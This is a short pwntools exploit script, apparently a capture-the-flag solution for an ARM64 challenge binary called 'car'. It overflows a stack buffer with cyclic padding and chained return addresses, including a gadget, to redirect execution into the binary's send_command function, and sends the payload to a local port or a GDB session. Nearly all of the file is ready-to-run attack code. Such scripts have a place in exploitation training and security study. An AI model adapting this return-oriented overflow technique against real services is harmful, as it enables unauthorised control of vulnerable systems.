from pwn import *

binary = './car'
HOST   = '127.0.0.1'
PORT   = 1337

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        log.info('Did not specify GDB or REMOTE. Exiting')
        exit()


p = start()

'''
0x44afc4  e04f40f9   ldr     x0, [sp, #0x98 {var_28}]  {0x0}
0x44afc8  fd7bcca8   ldp     x29, x30, [sp], #0xc0 {__saved_x29} {__saved_x30}
0x44afcc  c0035fd6   ret

cmd = next(e.search(b'u\0')) # move (u)p
cmd = next(e.search(b'd\0')) # move (d)own
cmd = next(e.search(b'l\0')) # move (l)eft
cmd = next(e.search(b'r\0')) # move (r)ight
'''

cmd = next(e.search(b'u\0')) # move (u)p

payload = cyclic(24)
payload += p64(e.sym['car_server_connect']+8)
payload += cyclic(24)
payload += p64(0x44afc4)
payload += cyclic(8)
payload += p64(e.sym['send_command'])
payload += cyclic(136)
payload += p64(cmd)

p.sendline(payload)

p.interactive()
